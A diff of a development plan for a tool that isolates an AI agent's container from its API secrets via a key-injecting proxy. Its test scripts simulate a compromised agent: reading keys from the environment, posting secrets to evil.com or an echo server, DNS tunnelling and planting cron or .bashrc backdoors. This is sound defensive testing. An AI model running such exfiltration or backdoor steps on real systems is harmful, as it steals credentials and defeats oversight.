@@ -1,475 +1,159 @@
-# Tier 2 Completion Plan - Full Integration & Testing
+# Tier 2 Plan — Aegis as Hermes Environment Backend
 
-**Goal**: Complete Tier 2 (container isolation) with end-to-end testing that proves secrets NEVER enter containers and the proxy transparently injects keys.
+**Goal**: Aegis Tier 2 wraps Hermes's existing Docker backend, adding proxy-based secret injection, outbound content scanning, encrypted vault, and tamper-proof audit trail. Secrets never enter the container.
 
-**Current State**: Infrastructure exists (60% done), orchestration missing (40% to go)
+**Architecture**: Option C — `AegisEnvironment(BaseEnvironment)` that Hermes dispatches to natively via `TERMINAL_ENV=aegis`.
 
----
-
-## What's Already Built (Verified with 142 tests)
-
-### ✅ Container Infrastructure
-- **builder.py**: Docker config with hardening (caps dropped, read-only FS, resource limits)
-- **runner.py**: Container lifecycle (start, stop, logs)
-- **Tests**: 9 tests verify config correctness
-
-### ✅ Proxy Infrastructure  
-- **addon.py**: ArmorAddon for mitmproxy (key injection + content scanning)
-- **injector.py**: LLM provider detection (OpenAI, Anthropic, etc.)
-- **runner.py**: Proxy startup with async support (fixed)
-- **Tests**: 13 tests verify injection logic and blocking
-
-### ✅ Integration Tests (Config Level)
-- **11 Docker tests**: Verify container config prevents secret leakage
-- **Limitation**: Tests check CONFIG, not actual RUNTIME behavior
-
-### ❌ Missing: Orchestration
-- CLI run command for Tier 2 is a placeholder 
-- No end-to-end test that actually runs a container with proxy
-- No verification that keys are actually injected at runtime
+**Estimated effort**: 8-11 hours across 6 phases.
 
 ---
 
-## Phase 5: Tier 2 Orchestration (Make It Run)
+## What Already Exists
 
-### Task 5.1 - Complete CLI Run Command for Tier 2
+### From Hermes (don't rebuild)
+- Docker container lifecycle (start, stop, exec, streaming, interrupts)
+- Per-task environment pooling with idle cleanup
+- Security hardening (cap-drop ALL, no-new-privileges, PID limits, tmpfs)
+- Resource limits (CPU, memory, disk)
+- Dangerous command approval system
+- Secret redaction from logs
+- File operations routed through environment backend
 
-**File**: `src/hermes_aegis/cli.py` (lines 210-214 are placeholder)
+### From Aegis Tier 1 (already tested, 131 passing)
+- Encrypted vault (Fernet + OS keyring)
+- Secret pattern detection (API keys, tokens, credentials)
+- Crypto key detection (ETH, BTC WIF, BIP32, Solana, BIP39 seed phrases)
+- Encoding-aware scanning (base64, hex, URL-encoded, reversed)
+- Audit trail with SHA-256 hash chain
+- Outbound HTTP scanner (urllib3 monkey-patch)
+- Middleware chain (allow/deny/needs-approval)
 
-**What to implement**:
+### From Aegis Tier 2 infrastructure (built, tested at config level)
+- ArmorAddon for mitmproxy (key injection + content scanning)
+- LLM provider matrix (OpenAI, Anthropic, Google, Groq, Together)
+- ContentScanner (scans URL, body, headers)
+- Container hardening config (read-only FS, resource limits)
+- Proxy runner with async fix
+
+---
+
+## Phase 1: AegisEnvironment Backend (1-2 hours)
+
+### Task 1.1 — Create AegisEnvironment
+
+**New file**: `src/hermes_aegis/environment.py`
+
+This is the core integration. Wraps Hermes's `DockerEnvironment` and adds the proxy sidecar.
 
 ```python
-elif tier == 2:
-    # Tier 2: Run in container with proxy
-    click.echo(f"[Tier {tier}] Starting proxy and container...")
-    
-    # 1. Load vault secrets
-    from hermes_aegis.vault.keyring_store import get_or_create_master_key
-    from hermes_aegis.vault.store import VaultStore
-    
-    master_key = get_or_create_master_key()
-    vault = VaultStore(VAULT_PATH, master_key)
-    
-    vault_secrets = {
-        "OPENAI_API_KEY": vault.get("OPENAI_API_KEY"),
-        "ANTHROPIC_API_KEY": vault.get("ANTHROPIC_API_KEY"),
-        # Add other LLM providers as needed
-    }
-    vault_secrets = {k: v for k, v in vault_secrets.items() if v is not None}
-    vault_values = vault.get_all_values()
-    
-    # 2. Start proxy in background
-    from hermes_aegis.proxy.runner import start_proxy
-    
-    proxy_thread = start_proxy(
-        vault_secrets=vault_secrets,
-        vault_values=vault_values,
-        audit_trail=trail,
-        listen_port=8443
-    )
-    
-    click.echo("Proxy started on port 8443")
-    time.sleep(1)  # Give proxy time to bind
-    
-    # 3. Ensure Docker network exists
-    import docker
-    from hermes_aegis.container.builder import ensure_network, ContainerConfig, build_run_args
-    
-    client = docker.from_env()
-    network = ensure_network(client)
-    
-    # 4. Start container
-    from hermes_aegis.container.runner import ContainerRunner
-    
-    workspace = Path.cwd()  # Use current directory as workspace
-    config = ContainerConfig(
-        workspace_path=str(workspace),
-        proxy_host="host.docker.internal",
-        proxy_port=8443
-    )
-    
-    runner = ContainerRunner(workspace_path=str(workspace))
-    runner.start()
-    
-    click.echo("Container started")
-    
-    # 5. Execute command in container
-    # TODO: Need to add exec() method to ContainerRunner
-    exit_code = runner.exec(list(command))
-    
-    # 6. Cleanup
-    runner.stop()
-    click.echo("Container stopped")
-```
+from tools.environments.base import BaseEnvironment
+from tools.environments.docker import DockerEnvironment
 
-**Tests to write**:
-1. Test proxy actually starts (check port 8443 is listening)
-2. Test container actually starts (check docker ps)
-3. Test command execution (mock for unit test)
+class AegisEnvironment(BaseEnvironment):
+    """Hermes execution backend with proxy-based secret isolation.
 
-**Integration test** (manual for now):
-```bash
-hermes-aegis run curl https://api.openai.com/v1/models
-# Should: start proxy, start container, curl inside sees injected key
-```
+    Wraps DockerEnvironment. Starts MITM proxy before container,
+    routes all container traffic through it. Secrets injected at
+    HTTP layer — never in container env vars.
+    """
 
----
+    def __init__(self, image, cwd, timeout, env=None, **kwargs):
+        super().__init__(cwd=cwd, timeout=timeout, env=env)
 
-### Task 5.2 - Add Container Exec Method
+        # Strip secrets from env — they go in the vault, not the container
+        clean_env = self._strip_secret_env_vars(env or {})
 
-**File**: `src/hermes_aegis/container/runner.py`
+        # Add proxy routing to container env
+        proxy_port = self._find_available_port()
+        clean_env["HTTP_PROXY"] = f"http://host.docker.internal:{proxy_port}"
+        clean_env["HTTPS_PROXY"] = f"http://host.docker.internal:{proxy_port}"
+        clean_env["NO_PROXY"] = "localhost,127.0.0.1"
+        clean_env["REQUESTS_CA_BUNDLE"] = "/certs/mitmproxy-ca-cert.pem"
+        clean_env["SSL_CERT_FILE"] = "/certs/mitmproxy-ca-cert.pem"
 
-**What to add**:
+        # Store secrets for proxy injection
+        self._vault_secrets = self._extract_api_keys(env or {})
+        self._proxy_port = proxy_port
+        self._proxy_thread = None
+        self._audit_trail = None
 
-```python
-class ContainerRunner:
-    # ... existing code ...
-    
-    def exec(self, command: list[str], stream_output: bool = True) -> int:
-        """Execute a command inside the running container.
-        
-        Args:
-            command: Command as list (e.g., ['python', 'script.py'])
-            stream_output: Print output in real-time
-            
-        Returns:
-            Exit code from command
-        """
-        if self._container is None:
-            raise RuntimeError("Container not started")
-        
-        exec_result = self._container.exec_run(
-            command,
-            stdout=True,
-            stderr=True,
-            stream=stream_output
+        # Create inner Docker environment with clean env
+        self._inner = DockerEnvironment(
+            image=image, cwd=cwd, timeout=timeout, env=clean_env, **kwargs
         )
-        
-        if stream_output:
-            for line in exec_result.output:
-                print(line.decode(), end='')
-        
-        return exec_result.exit_code
+
+    def execute(self, command, cwd="", *, timeout=None, stdin_data=None):
+        # Start proxy on first execute (lazy init)
+        if self._proxy_thread is None:
+            self._start_proxy()
+        return self._inner.execute(command, cwd, timeout=timeout, stdin_data=stdin_data)
+
+    def cleanup(self):
+        self._inner.cleanup()
+        # Proxy thread is daemon — dies with process
 ```
 
-**Test**:
+**Key design decisions**:
+- Lazy proxy start (first execute, not construction) — avoids port conflicts when environment is pooled but unused
+- Secrets stripped from env dict before passing to DockerEnvironment
+- CA cert mounted as read-only volume (no Dockerfile rebuild needed)
+- Auto-port selection prevents conflicts
+
+### Task 1.2 — Register as Hermes Backend
+
+**How Hermes discovers backends** (from `terminal_tool.py` line 441):
 ```python
-def test_exec_runs_command_in_container(mock_docker):
-    runner = ContainerRunner(workspace_path="/tmp/test")
-    runner.start()
-    
-    exit_code = runner.exec(['echo', 'hello'])
-    
-    mock_container.exec_run.assert_called_once()
-    assert exit_code == 0
+env_type = os.getenv("TERMINAL_ENV", "local")
 ```
 
----
-
-### Task 5.3 - Real End-to-End Integration Test
-
-**File**: `tests/integration/test_tier2_e2e.py`
-
-**What to test**:
-
-```python
-@pytest.mark.skipif(not docker_available(), reason="Docker required")
-@pytest.mark.integration
-def test_tier2_blocks_exfiltration_from_container(tmp_path, test_http_server):
-    """
-    End-to-end: Container tries to exfiltrate secret, proxy blocks it.
-    
-    Setup:
-    1. Create vault with secret
-    2. Start proxy with vault
-    3. Start container with proxy env
-    4. Run Python script inside container that tries to exfiltrate
-    5. Verify: Request blocked, server never received it
-    """
-    # 1. Setup vault
-    master_key = Fernet.generate_key()
-    vault = VaultStore(tmp_path / "vault.enc", master_key)
-    vault.set("SECRET", "sk-test-secret-xyz")
-    
-    # 2. Start test HTTP server on host
-    server = start_test_server(port=9999)
-    
-    # 3. Start proxy
-    trail = AuditTrail(tmp_path / "audit.jsonl")
-    proxy_thread = start_proxy(
-        vault_secrets={"SECRET": "sk-test-secret-xyz"},
-        vault_values=["sk-test-secret-xyz"],
-        audit_trail=trail,
-        listen_port=8443
-    )
-    time.sleep(1)
-    
-    # 4. Create exfiltration script
-    workspace = tmp_path / "workspace"
-    workspace.mkdir()
-    
-    script = workspace / "exfil.py"
-    script.write_text("""
-import requests
-# Try to exfiltrate the secret
-response = requests.post('http://host.docker.internal:9999/exfil', 
-                        json={'stolen': 'sk-test-secret-xyz'})
-print(f"Status: {response.status_code}")
-""")
-    
-    # 5. Run in container
-    runner = ContainerRunner(workspace_path=str(workspace))
-    runner.start()
-    
-    try:
-        exit_code = runner.exec(['python', '/workspace/exfil.py'])
-        
-        # Verify: Script ran but request was blocked by proxy
-        # Container saw 403 or connection error, NOT 200
-        assert exit_code != 0 or "403" in runner.last_output
-        
-        # Verify: Test server on host never received the secret
-        assert len(server.received_requests) == 0, \
-            "Secret reached server - proxy didn't block!"
-        
-        # Verify: Audit trail logged the block
-        entries = trail.read_all()
-        blocked_entries = [e for e in entries if "BLOCKED" in e.decision]
-        assert len(blocked_entries) > 0, "Proxy didn't log the block"
-        
-    finally:
-        runner.stop()
-        server.shutdown()
+**Registration approach**: Add `aegis` to the environment factory in Hermes config:
+```yaml
+# ~/.hermes/config.yaml
+terminal:
+  backend: aegis
 ```
 
-**This test proves**:
-- Proxy actually intercepts container traffic
-- Secrets are actually blocked
-- Container never sees vault
-- Audit trail records the block
-
----
-
-### Task 5.4 - Test Transparent Key Injection
-
-**File**: `tests/integration/test_tier2_key_injection.py`
-
-**What to test**:
-
-```python
-@pytest.mark.skipif(not docker_available(), reason="Docker required")
-@pytest.mark.integration  
-def test_tier2_injects_openai_key_transparently(tmp_path, mock_openai_server):
-    """
-    End-to-end: Container makes OpenAI API call without key, proxy injects it.
-    
-    Setup:
-    1. Vault has OPENAI_API_KEY
-    2. Mock OpenAI API server on host
-    3. Start proxy
-    4. Container script calls api.openai.com WITHOUT key
-    5. Verify: Proxy injected key, OpenAI mock received it, container never saw it
-    """
-    # 1. Setup vault
-    master_key = Fernet.generate_key()
-    vault = VaultStore(tmp_path / "vault.enc", master_key)
-    vault.set("OPENAI_API_KEY", "sk-injected-by-proxy")
-    
-    # 2. Start mock OpenAI server (records headers received)
-    mock_server = MockOpenAI Server(port=9998)
-    mock_server.start()
-    
-    # 3. Start proxy
-    trail = AuditTrail(tmp_path / "audit.jsonl")
-    proxy_thread = start_proxy(
-        vault_secrets={"OPENAI_API_KEY": "sk-injected-by-proxy"},
-        vault_values=["sk-injected-by-proxy"],
-        audit_trail=trail,
-        listen_port=8443
-    )
-    time.sleep(1)
-    
-    # 4. Create test script (no key in code)
-    workspace = tmp_path / "workspace"
-    workspace.mkdir()
-    
-    script = workspace / "test_api.py"
-    script.write_text("""
-import requests
-# No API key in environment or code
-response = requests.get('http://api.openai.com/v1/models')
-print(f"Status: {response.status_code}")
-""")
-    
-    # 5. Run in container
-    runner = ContainerRunner(workspace_path=str(workspace))
-    runner.start()
-    
-    try:
-        exit_code = runner.exec(['python', '/workspace/test_api.py'])
-        
-        # Verify: Request succeeded (proxy injected key)
-        assert exit_code == 0
-        
-        # Verify: Mock server received Authorization header
-        assert len(mock_server.requests) == 1
-        req = mock_server.requests[0]
-        assert req.headers.get("Authorization") == "Bearer sk-injected-by-proxy"
-        
-        # Verify: Container environment never had the key
-        env_dump = runner.exec(['env'])
-        assert "sk-injected-by-proxy" not in env_dump
-        
-    finally:
-        runner.stop()
-        mock_server.shutdown()
+**Or** via environment variable:
+```bash
+export TERMINAL_ENV=aegis
 ```
 
-**This proves**:
-- Proxy successfully injects keys
-- Container code works without knowing the key
-- Transparent to containerized agent
+**Implementation**: Either monkey-patch the factory at import time, or provide a small installer script that symlinks the backend.
 
----
+**Test**: Set `TERMINAL_ENV=aegis`, run `hermes chat -q "list files in /workspace"`. Verify command runs in container, no secrets in env.
 
-### Task 5.5 - Test Tier 2 Prevents Bypass Attacks
-
-**File**: `tests/integration/test_tier2_bypass.py`
-
-**Scenarios to test**:
-
-#### 5.5a - DNS Exfiltration (Should be MITIGATED)
-
-```python
-def test_dns_exfiltration_via_container_network_policy():
-    """
-    Container network should be restricted.
-    DNS query to evil.com should fail or be logged.
-    """
-    # Script tries: socket.getaddrinfo('sk-secret.evil.com', 80)
-    # Expected: Fails (no network) or logged by proxy
-```
-
-#### 5.5b - Raw Socket Bypass (Should be BLOCKED)
-
-```python
-def test_raw_socket_fails_in_container():
-    """
-    Container should not be able to create raw sockets.
-    """
-    # Script tries: socket.socket(socket.AF_INET, socket.SOCK_RAW)
-    # Expected: Permission denied (CAP_NET_RAW dropped)
-```
-
-#### 5.5c - Process Spawning (Should be BLOCKED)
-
-```python
-def test_curl_binary_not_available_in_container():
-    """
-    Container image should not have curl/wget/netcat.
-    """
-    # Script tries: subprocess.run(['curl', 'evil.com'])
-    # Expected: FileNotFoundError (curl not in image)
-```
-
-#### 5.5d - File System Escape (Should be BLOCKED)
-
-```python
-def test_cannot_write_outside_workspace():
-    """
-    Container filesystem is read-only except workspace.
-    """
-    # Script tries: open('/tmp/secret.txt', 'w').write(secret)
-    # Expected: OSError (Read-only filesystem)
-```
-
----
-
-## Phase 6: Tier 2 Container Image
-
-### Task 6.1 - Build Minimal Python Container
-
-**File**: `src/hermes_aegis/container/Dockerfile`
-
-**Requirements**:
-- Python 3.11+
-- requests, urllib3 (for HTTP)
-- NO curl, wget, netcat, nslookup, dig
-- Non-root user `hermes`
-- Minimal base (alpine or distroless)
-
-**Dockerfile**:
-```dockerfile
-FROM python:3.11-alpine
-
-# Create non-root user
-RUN adduser -D -u 1000 hermes
-
-# Install only essential packages
-RUN pip install --no-cache-dir requests urllib3
-
-# Set working directory
-WORKDIR /workspace
-
-# Run as non-root
-USER hermes
-
-# Default: Drop into shell (overridden by exec)
-CMD ["/bin/sh"]
-```
-
-**Test**:
-- Build image: `docker build -t hermes-aegis:latest -f src/hermes_aegis/container/Dockerfile .`
-- Verify: `docker run hermes-aegis:latest which curl` returns empty (not found)
-- Verify: `docker run hermes-aegis:latest whoami` returns `hermes`
-
----
-
-### Task 6.2 - Network Policy Configuration
-
-**File**: `src/hermes_aegis/container/builder.py`
-
-**Add network restrictions**:
-
-```python
-def build_run_args(config: ContainerConfig) -> dict:
-    # ... existing code ...
-    return {
-        # ... existing config ...
-        
-        # Restrict DNS (only use proxy)
-        "dns": [config.proxy_host],
-        
-        # OR: More paranoid - no network at all except through proxy
-        # "network_mode": "none",  # Then manually connect to armor network
-    }
-```
-
-**Trade-off**:
-- `dns: [proxy]` - DNS goes through proxy, can be monitored
-- `network_mode: none` - Completely airgapped, only container→proxy allowed
-
-**Test**:
-- Container DNS query should route through proxy
-- Direct DNS queries should fail or be logged
-
----
-
-### Task 6.3 - Proxy Health Check
+### Task 1.3 — Port Auto-Selection
 
 **File**: `src/hermes_aegis/proxy/runner.py`
 
-**Add**:
+```python
+def find_available_port(start=8443, end=8500) -> int:
+    """Find an available port for the proxy."""
+    import socket
+    for port in range(start, end):
+        try:
+            sock = socket.socket()
+            sock.bind(('localhost', port))
+            sock.close()
+            return port
+        except OSError:
+            continue
+    raise RuntimeError(f"No available port in range {start}-{end}")
+```
+
+### Task 1.4 — Proxy Health Check
+
+**File**: `src/hermes_aegis/proxy/runner.py`
+
 ```python
 def wait_for_proxy_ready(port: int, timeout: int = 5) -> bool:
-    """Poll until proxy is listening on port."""
-    import socket
-    import time
-    
+    """Poll until proxy is listening."""
+    import socket, time
     start = time.time()
     while time.time() - start < timeout:
         try:
             sock = socket.socket()
+            sock.settimeout(0.5)
             sock.connect(('localhost', port))
             sock.close()
             return True
@@ -478,248 +162,610 @@ def wait_for_proxy_ready(port: int, timeout: int = 5) -> bool:
     return False
 ```
 
-**Use in CLI**:
+---
+
+## Phase 2: Network Isolation (30 min)
+
+### Task 2.1 — Internal Network
+
+**File**: `src/hermes_aegis/container/builder.py`
+
+The Docker network must be `internal: true`. This means containers on the network can reach each other and the host (via `host.docker.internal`), but have **zero direct internet access**. All outbound traffic must go through the proxy.
+
 ```python
-proxy_thread = start_proxy(...)
-if not wait_for_proxy_ready(8443):
-    raise RuntimeError("Proxy failed to start")
+def ensure_network(client) -> str:
+    try:
+        net = client.networks.get(ARMOR_NETWORK)
+        # Verify it's internal
+        if not net.attrs.get("Internal", False):
+            net.remove()
+            raise Exception("recreate")
+    except Exception:
+        client.networks.create(
+            ARMOR_NETWORK,
+            driver="bridge",
+            internal=True,  # THIS IS THE KEY LINE — no internet access
+            labels={"managed-by": "hermes-aegis"},
+        )
+    return ARMOR_NETWORK
 ```
 
+**Why this matters**: With `internal: True`:
+- HTTP/HTTPS through proxy: Works (container → host.docker.internal → proxy → internet)
+- Direct TCP to attacker.com: Blocked (no route)
+- DNS tunneling: Blocked (no DNS route to internet)
+- ICMP tunneling: Blocked (no route)
+- Raw sockets: Blocked (CAP_NET_RAW dropped AND no route)
+
+This single flag closes the entire class of "bypass the proxy" attacks.
+
+**Test**: From inside container, `python -c "import socket; socket.create_connection(('8.8.8.8', 53))"` should fail with `Network is unreachable`.
+
 ---
 
-## Phase 7: Integration Testing (Real Execution)
+## Phase 3: CA Certificate Handling (1 hour)
 
-### Task 7.1 - Test Real Agent Execution in Container
+### Task 3.1 — Generate and Mount CA Cert
 
-**File**: `tests/integration/test_real_agent.py`
+**No Dockerfile rebuild needed.** Mount the cert as a read-only volume.
 
-**What to test**:
+mitmproxy generates its CA cert at `~/.mitmproxy/mitmproxy-ca-cert.pem` on first run. If it doesn't exist yet, generate it:
 
 ```python
-@pytest.mark.integration
-@pytest.mark.docker
-def test_agent_can_run_in_tier2_container():
-    """
-    Run actual hermes agent command inside container.
-    Verify it works and secrets are protected.
-    """
-    # 1. Setup vault with OpenAI key
-    # 2. Start proxy + container
-    # 3. Run: hermes chat -q "What's 2+2?" 
-    # 4. Verify: Response received (proves agent works)
-    # 5. Verify: Container never saw API key (env dump)
-    # 6. Verify: Proxy logged key injection (audit trail)
+def ensure_mitmproxy_ca_cert() -> Path:
+    """Ensure mitmproxy CA certificate exists."""
+    cert_path = Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem"
+    if cert_path.exists():
+        return cert_path
+
+    # Generate by starting and immediately stopping mitmproxy
+    import subprocess
+    proc = subprocess.Popen(
+        ["mitmdump", "--set", "listen_port=0"],  # port 0 = OS picks
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    import time
+    time.sleep(2)
+    proc.terminate()
+    proc.wait()
+
+    if not cert_path.exists():
+        raise RuntimeError("Failed to generate mitmproxy CA certificate")
+    return cert_path
 ```
 
-**This is the ULTIMATE test** - proves the entire Tier 2 architecture works end-to-end.
+### Task 3.2 — Add Cert Volume to Container Config
 
----
+**File**: `src/hermes_aegis/container/builder.py`
 
-### Task 7.2 - Test Multi-Request Scenarios
-
-**What to test**:
-
-1. **Multiple LLM providers**: OpenAI then Anthropic in same container
-2. **Mixed traffic**: LLM calls + regular HTTP + blocked exfiltration
-3. **Long-running container**: Multiple agent conversations in same container
-4. **Container restart**: Proxy survives, new container connects
-
-**Files**: `tests/integration/test_tier2_scenarios.py`
-
----
-
-### Task 7.3 - Performance Benchmarks
-
-**What to measure**:
-
-1. **Proxy overhead**: Latency added to HTTP requests
-2. **Container startup time**: How long to start proxy + container
-3. **Scanner performance**: Time to scan request with 100 vault secrets
-4. **Memory usage**: Proxy + container overhead
-
-**Acceptable targets**:
-- Proxy latency: <10ms per request
-- Startup: <5 seconds (proxy + container)
-- Scan: <1ms per request
-- Memory: <512MB total overhead
-
-**Files**: `tests/benchmarks/test_performance.py`
-
----
-
-## Phase 8: Real-World Attack Simulation
-
-### Task 8.1 - Red Team Scenarios
-
-**Create attack scripts that try everything**:
-
-1. **Multi-vector attack**: Try HTTP, DNS, socket, subprocess in sequence
-2. **Sophisticated encoding**: Chunked strings, hex, unicode, nested encoding
-3. **Indirect channels**: Write secret to file, exfil file later
-4. **Timing attacks**: Measure response time to infer secret bits
-5. **Container escape**: Try to break out to host
-
-**Expected results**:
-- HTTP: BLOCKED ✅
-- DNS: Fails (no network) or logged ⚠️
-- Socket: Permission denied ✅
-- Subprocess: curl not found ✅
-- Files: Write succeeds, exfil blocked ⚠️
-- Timing: Not defended ❌ (out of scope)
-- Escape: Blocked (dropped caps, read-only FS) ✅
-
-**Document**: Which attacks work, which don't, why.
-
----
-
-### Task 8.2 - Malicious Agent Simulation
-
-**Scenario**: Agent is compromised (jailbroken, prompt-injected)
-
-**Test script**:
 ```python
-# Simulated malicious agent code
-vault_secret = os.environ.get("OPENAI_API_KEY")  # Should be None
-print(f"Got secret from env: {vault_secret}")
+def build_run_args(config: ContainerConfig) -> dict:
+    cert_path = str(Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem")
 
-# Try to read vault file
-try:
-    vault_path = Path.home() / ".hermes-aegis" / "vault.enc"
-    content = vault_path.read_text()
-    print(f"Read vault: {len(content)} bytes")
-except FileNotFoundError:
-    print("Vault not accessible - ✅ PROTECTED")
+    return {
+        # ... existing config ...
+        "volumes": {
+            config.workspace_path: {"bind": "/workspace", "mode": "rw"},
+            cert_path: {"bind": "/certs/mitmproxy-ca-cert.pem", "mode": "ro"},
+        },
+        "environment": {
+            "HTTP_PROXY": proxy_url,
+            "HTTPS_PROXY": proxy_url,
+            "REQUESTS_CA_BUNDLE": "/certs/mitmproxy-ca-cert.pem",
+            "SSL_CERT_FILE": "/certs/mitmproxy-ca-cert.pem",
+            "NO_PROXY": "localhost,127.0.0.1",
+            "HOME": "/home/hermes",
+        },
+        # ...
+    }
+```
 
-# Try to exfiltrate via HTTP
+**Why this works**: `REQUESTS_CA_BUNDLE` tells Python's `requests` and `urllib3` to trust this CA. `SSL_CERT_FILE` tells OpenSSL (used by most other Python HTTP libraries) the same. No need to run `update-ca-certificates` in the container.
+
+**Test**: From container, `python -c "import requests; print(requests.get('https://example.com').status_code)"` should return 200 (routed through proxy, cert trusted).
+
+---
+
+## Phase 4: Crypto-Specific Pattern Improvements (1 hour)
+
+### Task 4.1 — Expand BIP39 Wordlist
+
+**File**: `src/hermes_aegis/patterns/crypto.py`
+
+Current: 20 words. Needs: full 2048-word BIP39 list (or top 200 most common).
+
+The 20-word sample catches seed phrases where 50%+ of words match those 20. That means a real 12-word phrase needs 6+ of its words to be in the sample. With only 20 of 2048 words, probability of catching a random phrase is very low.
+
+**Fix**: Ship the full BIP39 English wordlist. It's 2048 words — about 15KB. Load it from a data file:
+
+```python
+# src/hermes_aegis/patterns/bip39_english.txt (one word per line, 2048 lines)
+# Source: https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt
+
+BIP39_WORDLIST: set[str] = set()
+
+def _load_bip39():
+    global BIP39_WORDLIST
+    wordlist_path = Path(__file__).parent / "bip39_english.txt"
+    if wordlist_path.exists():
+        BIP39_WORDLIST = set(wordlist_path.read_text().strip().splitlines())
+    else:
+        BIP39_WORDLIST = BIP39_SAMPLE_WORDS  # fallback to current 20
+```
+
+Lower the match threshold from 50% to 40% — a 12-word phrase where 5+ words are BIP39 is almost certainly a seed phrase.
+
+### Task 4.2 — Add RPC URL Pattern Detection
+
+**File**: `src/hermes_aegis/patterns/secrets.py`
+
+Detect API keys embedded in RPC/provider URLs:
+
+```python
+# Alchemy, Infura, QuickNode URLs with embedded keys
+("rpc_url_with_key", re.compile(
+    r"https?://(?:eth-mainnet\.g\.alchemy\.com/v2|mainnet\.infura\.io/v3|"
+    r"[a-z-]+\.quiknode\.pro)/[A-Za-z0-9_-]{20,}"
+)),
+```
+
+These are common in `.env` files and hardhat/foundry configs. A leaked Alchemy key means someone can use your RPC credits and potentially see your pending transactions.
+
+### Task 4.3 — Add HD Derivation Path Logging
+
+Not a secret, but useful for audit awareness:
+
+```python
+# HD derivation paths — signal crypto operations happening
+("hd_derivation_path", re.compile(r"m/\d+['h]?/\d+['h]?/\d+['h]?(?:/\d+)*")),
+```
+
+Log these as `INFO` in the audit trail, not `BLOCKED`. Seeing `m/44'/60'/0'/0/0` in the audit means the agent was deriving wallet addresses — worth knowing during forensics.
+
+---
+
+## Phase 5: Integration Tests — Real Attacks (3-4 hours)
+
+All tests require Docker. Skip cleanly with `@pytest.mark.skipif`.
+
+### Task 5.1 — Exfiltration from Container (Blocked)
+
+**File**: `tests/integration/test_tier2_exfiltration.py`
+
+```python
+@pytest.mark.skipif(not shutil.which("docker"), reason="Docker required")
+class TestTier2Exfiltration:
+
+    def test_env_var_secret_theft(self, aegis_container):
+        """Attack: scan env vars for API keys and send them out."""
+        script = '''
+import os, json
+# Realistic attack: enumerate env for anything valuable
+secrets = {k: v for k, v in os.environ.items()
+           if any(w in k.upper() for w in ['KEY', 'SECRET', 'TOKEN', 'PASSWORD'])}
+print(json.dumps(secrets))
+'''
+        result = aegis_container.execute(f'python3 -c """{script}"""')
+        output = json.loads(result["output"])
+
+        # Container env should have ZERO secrets
+        assert len(output) == 0, f"Secrets found in container env: {list(output.keys())}"
+
+    def test_http_body_exfiltration(self, aegis_container, echo_server):
+        """Attack: send secret in HTTP request body to attacker server."""
+        script = f'''
 import requests
 try:
-    requests.post("http://evil.com/exfil", json={"secret": vault_secret})
+    requests.post("http://host.docker.internal:{echo_server.port}/exfil",
+                  json={{"stolen": "sk-proj-test-secret-key-12345"}}, timeout=5)
+    print("SENT")
 except Exception as e:
-    print(f"HTTP blocked: {e} - ✅ PROTECTED")
+    print(f"BLOCKED: {{e}}")
+'''
+        result = aegis_container.execute(f'python3 -c """{script}"""')
+        assert "BLOCKED" in result["output"] or echo_server.request_count == 0
 
-# Try subprocess
-import subprocess
+    def test_base64_encoded_exfiltration(self, aegis_container, echo_server):
+        """Attack: base64-encode a secret before sending."""
+        script = f'''
+import requests, base64
+secret = "sk-proj-test-secret-key-12345"
+encoded = base64.b64encode(secret.encode()).decode()
 try:
-    subprocess.run(['curl', 'evil.com'], check=True)
-except FileNotFoundError:
-    print("curl not available - ✅ PROTECTED")
+    requests.post("http://host.docker.internal:{echo_server.port}/exfil",
+                  data=encoded, timeout=5)
+    print("SENT")
+except Exception as e:
+    print(f"BLOCKED: {{e}}")
+'''
+        result = aegis_container.execute(f'python3 -c """{script}"""')
+        assert "BLOCKED" in result["output"] or echo_server.request_count == 0
 
-# Try DNS
+    def test_direct_tcp_bypass(self, aegis_container):
+        """Attack: bypass proxy with direct TCP connection."""
+        script = '''
 import socket
 try:
-    socket.getaddrinfo('secret.evil.com', 80)
-except socket.gaierror:
-    print("DNS failed - ✅ PROTECTED")
+    s = socket.create_connection(("8.8.8.8", 53), timeout=3)
+    s.close()
+    print("CONNECTED")
+except Exception as e:
+    print(f"BLOCKED: {e}")
+'''
+        result = aegis_container.execute(f'python3 -c """{script}"""')
+        assert "BLOCKED" in result["output"]
+
+    def test_dns_tunneling(self, aegis_container):
+        """Attack: encode data in DNS queries."""
+        script = '''
+import socket
+try:
+    socket.getaddrinfo("sk-proj-secret.evil.com", 80)
+    print("RESOLVED")
+except Exception as e:
+    print(f"BLOCKED: {e}")
+'''
+        result = aegis_container.execute(f'python3 -c """{script}"""')
+        assert "BLOCKED" in result["output"]
+
+    def test_workspace_file_scan(self, aegis_container, echo_server):
+        """Attack: scan workspace files for secrets, try to exfil."""
+        script = f'''
+import glob, requests
+for f in glob.glob("/workspace/**/*", recursive=True):
+    try:
+        with open(f) as fh:
+            content = fh.read()
+            if "sk-" in content or "0x" in content:
+                requests.post("http://host.docker.internal:{echo_server.port}/exfil",
+                              data=content, timeout=5)
+                print("SENT")
+    except:
+        pass
+print("DONE")
+'''
+        result = aegis_container.execute(f'python3 -c """{script}"""')
+        assert echo_server.request_count == 0, "Workspace secrets reached echo server"
+
+    def test_filesystem_read_only(self, aegis_container):
+        """Attack: try to write persistent backdoor outside workspace."""
+        script = '''
+import os
+for path in ["/usr/local/bin/backdoor", "/etc/cron.d/exfil", "/home/hermes/.bashrc"]:
+    try:
+        with open(path, "w") as f:
+            f.write("malicious")
+        print(f"WROTE {path}")
+    except Exception as e:
+        print(f"BLOCKED {path}: {e}")
+'''
+        result = aegis_container.execute(f'python3 -c """{script}"""')
+        assert "WROTE" not in result["output"]
 ```
 
-**Expected output**: Every attack fails, script prints "✅ PROTECTED"
+### Task 5.2 — Key Injection Verification
 
-**This proves Tier 2 actually works against a determined attacker.**
+**File**: `tests/integration/test_tier2_injection.py`
 
----
+```python
+@pytest.mark.skipif(not shutil.which("docker"), reason="Docker required")
+class TestTier2KeyInjection:
 
-## Estimated Effort
+    def test_openai_key_injected(self, aegis_container_with_vault, echo_server_as_openai):
+        """Container calls OpenAI API without key. Proxy injects it."""
+        script = f'''
+import requests
+# No API key in code or environment
+r = requests.get("https://api.openai.com/v1/models", timeout=10)
+print(f"STATUS: {{r.status_code}}")
+'''
